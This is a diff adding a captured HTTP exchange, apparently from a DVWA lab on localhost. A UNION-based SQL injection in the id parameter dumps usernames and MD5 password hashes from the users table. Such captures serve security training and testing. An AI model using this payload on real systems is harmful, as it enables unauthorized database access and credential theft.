@@ -1,0 +1,14 @@
+GET /dvwa/vulnerabilities/sqli/?id=1%27+UNION+SELECT+user%2Cpassword+FROM+users--+-&Submit=Submit HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Lab-Analyzer/1.0
+Cookie: PHPSESSID=<REDACTED_LAB_SESSION>; security=low
+
+=== RESPONSE ===
+HTTP/1.1 200 OK
+Content-Type: text/html;charset=utf-8
+Server: Apache/2.4.68 (Debian)
+
+<div class="vulnerable_code_area">
+  <pre>ID: 1' UNION SELECT user,password FROM users-- -<br />First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
+  <pre>ID: 1' UNION SELECT user,password FROM users-- -<br />First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
+</div>
